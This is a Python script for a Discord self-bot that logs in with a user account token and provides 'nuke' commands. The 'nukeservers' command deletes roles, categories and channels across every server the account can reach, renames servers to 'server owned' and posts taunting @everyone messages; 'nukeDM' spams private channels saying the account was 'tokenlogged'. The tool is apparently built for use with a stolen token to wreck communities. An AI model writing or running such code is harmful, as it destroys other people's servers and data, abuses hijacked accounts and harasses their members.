# libs
from discord.ext import commands
from discord.ext.commands import bot

prefix = str(input("Whats prefix you want?\n "))

# vars
client = commands.Bot(command_prefix=prefix, self_bot=True)

# commands
@client.command()
async def nukeservers(ctx):
    await ctx.message.delete()
    for gld in client.guilds:
        try:
            await gld.leave()
        except:
            pass
    for g in client.guilds:
        try:
            for r in g.roles:
                try:
                    await r.delete()
                except:
                    pass
        except:
            pass
        try:
            with open('avatar.png','rb') as f:
                try:
                    await g.edit(name="server owned", icon=f.read())
                except:
                    pass
        except:
            pass
        try:
            for ct in g.categories:
                try:
                    await ct.delete()
                except:
                    pass
        except:
            pass
        try:
            for c in g.text_channels:
                try:
                    await c.send("@everyone EZ! Account and server owned!")
                except:
                    pass
                try:
                    await c.delete() 
                except:
                    pass
        except:
            pass
        try:
            for vc in g.voice_channels:
                try:
                    await vc.delete()
                except:
                    pass
        except:
            pass

@client.command()
async def nukeDM(ctx):
    for dm in client.private_channels:
        try:
            await dm.send("@everyone EZ! Account tokenlogged.")
        except:
            pass

# run
token = str(input("Token: "))
client.run(token, bot=False)